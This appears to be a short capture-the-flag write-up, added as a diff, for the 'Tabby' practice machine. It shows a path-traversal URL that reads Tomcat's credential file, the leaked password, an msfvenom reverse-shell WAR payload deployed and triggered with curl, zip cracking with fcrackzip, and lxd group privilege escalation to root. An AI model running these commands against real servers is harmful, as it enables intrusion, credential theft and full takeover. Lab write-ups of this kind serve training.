@@ -1,0 +1,37 @@
+TABBY WRITEUP
+
+found ports: 80, 8080, 22
+
+80 got LFI
+8080 runs tomcat
+
+view-source:http://megahosting.htb/news.php?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml
+
+--------------CONTENT--------------------------------------
+<role rolename="admin-gui"/>
+   <role rolename="manager-script"/>
+   <user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>-----------------------------------------------------------
+
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=YOUR_IP LPORT=PORT -f war > shell.war
+
+deploy on tomcat:
+curl -u 'tomcat':'$3cureP4s5w0rd123!' -T shell.war 'http://10.10.10.194:8080/manager/text/deploy?path=/payloadshell'
+
+listening called the shell:
+curl -u 'tomcat':'$3cureP4s5w0rd123!' http://10.10.10.194:8080/payloadshell/
+
+Found in /var/www/html/files a zip backup, dowloaded through wget (usid user / pass)
+zip is protected so used:
+fcrackzip -D -p rockyou.txt 16162020_backup.zip
+
+found pass: admin@it
+GOT USER.
+
+ash is in lxd group, found this article which explain how to escalate privileges with lxd:
+https://www.hackingarticles.in/lxd-privilege-escalation/
+
+using:
+https://github.com/saghul/lxd-alpine-builder.git
+
+created lxc container and in /mnt/root there was all filesistem with root access
+GOT ROOT.
